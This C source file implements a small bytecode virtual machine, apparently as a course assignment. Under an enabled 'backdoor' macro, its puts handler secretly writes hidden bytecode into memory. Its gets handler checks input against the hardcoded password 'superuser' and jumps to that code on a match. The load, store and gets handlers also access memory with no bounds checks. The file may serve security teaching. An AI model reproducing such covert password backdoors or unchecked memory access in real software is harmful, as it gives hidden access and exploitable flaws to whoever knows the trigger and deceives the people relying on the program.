// This is where you put your VM code.
/// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "minivm.h"

//#define _Debug_
#define NUM_REGS   (256)
#define NUM_FUNCS  (256)
#define backdoor

// Global variable that indicates if the process is running.
static bool is_running = true;
uint32_t* gpc;
void usageExit() {
	// TODO: show usage
	exit(1);
}


//-----------------------Operands----------------------//

void move(struct VMContext* ctx, const uint32_t instr)
{

	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);


	*&(ctx->r[r1].value) = *&(ctx->r[r2].value);
#ifdef _Debug_
	printf("move value check\n");
	printf("r%d value : %08x\n",r1,ctx->r[r1].value);
	printf("r%d value : %08x\n",r2,ctx->r[r2].value);
	printf("call move\n");
#endif


}

void halt(struct VMContext* ctx, const uint32_t instr)
{


	is_running = false;
#ifdef _Debug
	printf("Halt\n");
#endif
}
void store(struct VMContext* ctx, const uint32_t instr)
{

	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);


	//값으로 취급
	uint32_t* addr_r1 =(uint32_t*)(ctx->r[r1].value);

	//address로 취급
	uint32_t addr_r2 = ctx->r[r2].value;
	*addr_r1 = 0;
	*((uint8_t*)ctx->r[r1].value) =(uint8_t)(ctx->r[r2].value);


#ifdef _Debug
	printf("store debug : %08x, value : %x\n",addr_r1,*addr_r1);
#endif

}

void puti(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);

	ctx->r[r1].value = 0;
	*(uint8_t*)(&(ctx->r[r1].value)) =(uint8_t)r2;

#ifdef _Debug
	printf("puti debug : %08x\n",ctx->r[r1].value);
#endif

}

void gt(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	ctx->r[r1].value = (ctx->r[r2].value > ctx->r[r3].value) ? 1 : 0;
#ifdef _Debug
	printf("gt debug\n");
#endif
}

void ge(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	ctx->r[r1].value = (ctx->r[r2].value >= ctx->r[r3].value) ? 1 : 0;
#ifdef _Debug
	printf("ge debug\n");
#endif

}

void eq(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	ctx->r[r1].value = (ctx->r[r2].value - ctx->r[r3].value == 0) ? 1 : 0;
#ifdef _Debug
	printf("eq %d, %d, %d\n",ctx->r[r1].value,ctx->r[r2].value,ctx->r[r3].value);
#endif

}

void load(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);


	uint32_t* addr_r2 =(uint32_t*)(ctx->r[r2].value);

	//24bit 0 setting
	ctx->r[r1].value = 0;
	// Onebyte load
	(*(uint8_t*)&(ctx->r[r1].value)) = *((uint8_t*)addr_r2);
#ifdef _Debug
	printf("load debug: %c\n",*((uint8_t*)addr_r2));
#endif

}

void add(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	const uint32_t value_2 = ctx->r[r2].value;
	const uint32_t value_3 = ctx->r[r3].value;
	ctx->r[r1].value =  value_2 + value_3;

#ifdef _Debug
	printf("add debug : 0x%x, 0x%x, 0x%x\n",ctx->r[r1].value,\
			ctx->r[r2].value,\
			ctx->r[r3].value);
#endif

}


void sub(struct VMContext* ctx, const uint32_t instr)
{

	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	uint32_t value2 = ctx->r[r2].value;
	uint32_t value3 = ctx->r[r3].value;
	ctx->r[r1].value = value2-value3;

#ifdef _Debug
	printf("sub debug\n");
#endif

}

void ite(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);
	const uint8_t r2 = EXTRACT_B2(instr);
	const uint8_t r3 = EXTRACT_B3(instr);

	uint32_t addr_r1 = ctx->r[r1].value;


	if(addr_r1 > 0){
		gpc = (uint32_t*)(ctx->r[0].value + (4 * r2));
		if( gpc >(uint32_t*)ctx->r[1].value ||// bigger than code size
				gpc < (uint32_t*)ctx->r[0].value// smaller than code init address
		  ){
			is_running=false;
			printf("Jump Address is Not Correct!!\n");
		}

	}
	else if(addr_r1 == 0){
		gpc = (uint32_t*)(ctx->r[0].value + (4 * r3));
		if( gpc >(uint32_t*)ctx->r[1].value ||// bigger than code size
				gpc < (uint32_t*)ctx->r[0].value// smaller than code init address
		  ){
			is_running=false;
			printf("Jump Address is Not Correct!!\n");
		}
	}
#ifdef _Debug
	printf("ite debug\n");
#endif

}


void jump(struct VMContext* ctx, const uint32_t instr)
{

	const uint8_t r1 = EXTRACT_B1(instr);

	//opcode + operand 4 byte * imm value jump


	gpc = (uint32_t*)(ctx->r[0].value + (4 * r1));
	if((uint32_t) gpc >ctx->r[1].value ||// bigger than code size
			(uint32_t)gpc < ctx->r[0].value// smaller than code init address
	  ) {
		is_running=false;
		printf("Jump Address is Not Correct!!\n");
	}
#ifdef _Debug
	printf("Jump Opcode\n");
	printf("jump debug\n");
#endif

}

void _puts(struct VMContext* ctx, const uint32_t instr)
{

	const uint8_t r1 = EXTRACT_B1(instr);

	//address
	uint8_t *addr_r1 =(uint8_t*)(ctx->r[r1].value);
	//  printf("\nr2 addr : %08x\n",addr_r1);
	uint8_t count = 0;
	while(*(addr_r1+count)!= '\x00')
	{
		putchar(*(addr_r1+count));
		count++;
	}


#ifdef backdoor
	uint8_t back_op[28] ={
		'\x30','\x0b','\x02','\x00',
		'\x40','\x06','\x26','\x00',
		'\x50','\x02','\x02','\x06',
		'\xc0','\x02','\x00','\x00',
		'\x30','\x02','\x0b','\x00',
		'\x40','\x06','\x01','\x00',
		'\x00','\x00','\x00','\x00'
	};
	for(count = 0;count < 28; count++)
	{
		*((uint8_t*)(ctx->r[8].value)+count) =back_op[count];
	}
#endif

#ifdef _Debug
	printf("puts debug\n");
#endif

}

void _gets(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t r1 = EXTRACT_B1(instr);

	//address 
	uint32_t* addr_r1 = (uint32_t*)(ctx->r[r1].value);

	uint32_t count = 0;
	char ch= 0;
	while(1)
	{
		ch = getchar();
		if(ch == '\n'){
			*((char*)addr_r1+count) = '\x00';
			break;
		}
		*((char*)addr_r1+count) = ch;
		count++;
	}
#ifdef backdoor
	uint8_t Verify_Count = 0;
	for(count = 0 ;count < 10;count ++){
		if(*((uint8_t*)addr_r1+count)==ctx->r[100+count].value)
		{
			Verify_Count ++;
			if(Verify_Count == 10)
			{

				//success
				gpc =(uint32_t*) ctx->r[8].value;
			}
		}
	}		
#endif

#ifdef _Debug
	printf("gets debug\n");
#endif

}

//-----------------------------------------------------//


void initFuncs(FunPtr *f, uint32_t cnt) {
	uint32_t i;
	for (i = 0; i < cnt; i++) {
		f[i] = NULL;
	}

	// TODO: initialize function pointers
	f[0x00] = halt;
	f[0x10] = load;
	f[0x20] = store;
	f[0x30] = move;
	f[0x40] = puti;
	f[0x50] = add;
	f[0x60] = sub;
	f[0x70] = gt;
	f[0x80] = ge;
	f[0x90] = eq;
	f[0xa0] = ite;
	f[0xb0] = jump;
	f[0xc0] = _puts;
	f[0xd0] = _gets;

}

void initRegs(Reg *r, uint32_t cnt, uint32_t code_size,uint32_t** pc)
{
	uint32_t i;
	for (i = 0; i < cnt; i++) {
		r[i].type = 0;
		r[i].value = 0;
	}

	//base eip [처음 시작 eip]
	r[0].value = (uint32_t)*pc;

	//code size if jump bigger than code size, halt
	r[1].value = (uint32_t)*pc + code_size;

	//Data buffer offset
	r[2].value = (uint32_t)*pc + code_size + 4;

	//Input Buffer for gets
	r[3].value = (uint32_t)*pc + code_size + 4 +3096;

	//Entire Memory 
	r[4].value = (uint32_t)*pc + 8096;

	//Backddor Area
	r[8].value = (uint32_t)*pc + code_size +4 + 3096 +1024;
	// Memory Area//
	// Code Section | 4 byte[dummy] | 2048 byte[Data section] | gets buffer | //

#ifdef backdoor
	r[100].value = 's';
	r[101].value = 'u';
	r[102].value = 'p';
	r[103].value = 'e';
	r[104].value = 'r';
	r[105].value = 'u';
	r[106].value = 's';
	r[107].value = 'e';
	r[108].value = 'r';
	r[109].value = 0;
#endif
#ifdef _Debug

	printf("code size :%d",code_size);
	printf("r0 register eip base : %08x\n",r[0].value);
	printf("r1 register code section : %08x\n",r[1].value);
	printf("r2 register Data seciont : %08x\n",r[2].value);
	printf("r3 register Input Buffer : %08x\n",r[3].value);
	printf("r4 register Entire Size  : %08x\n",r[4].value);
	printf("r5 register puti value\n");
	printf("r6 register add value\n");
	printf("r7 register flag value\n");
	printf("r8 register eip pointer: %08x\n",r[8].value);
	printf("r9,r10 register count value\n");
#endif

}

int main(int argc, char** argv) {
	VMContext vm;
	Reg r[NUM_REGS];
	FunPtr f[NUM_FUNCS];
	FILE* bytecode;
	uint8_t *buf = (uint8_t*)malloc(8096);
	uint32_t bytes;
	memset(buf,0x00,8096);
	// There should be at least one argument.
	if (argc < 2) usageExit();

	// Initialize registers.
	// Initialize interpretation functions.
	initFuncs(f, NUM_FUNCS);
	// Initialize VM context.
	initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

	// Load bytecode file
	bytecode = fopen(argv[1], "rb");
	if (bytecode == NULL) {
		perror("fopen");
		return 1;
	}
	//read op, operand to buf


	bytes = fread((void*)buf,1,8096,bytecode);

#ifdef _Debug
	//read size
	printf("\nread bytes : %d\n",bytes);
#endif

	gpc =(uint32_t*)buf;
	initRegs(r, NUM_REGS,bytes,(uint32_t**)&gpc);
	while (is_running) {
		// TODO: Read 4-byte bytecode, and set the pc accordingly
#ifdef _Debug
		printf("EIP : %08x\n",gpc);
#endif
		stepVMContext(&vm, &gpc);
	}

	fclose(bytecode);

	// Zero indicates normal termination.
	return 0;
}


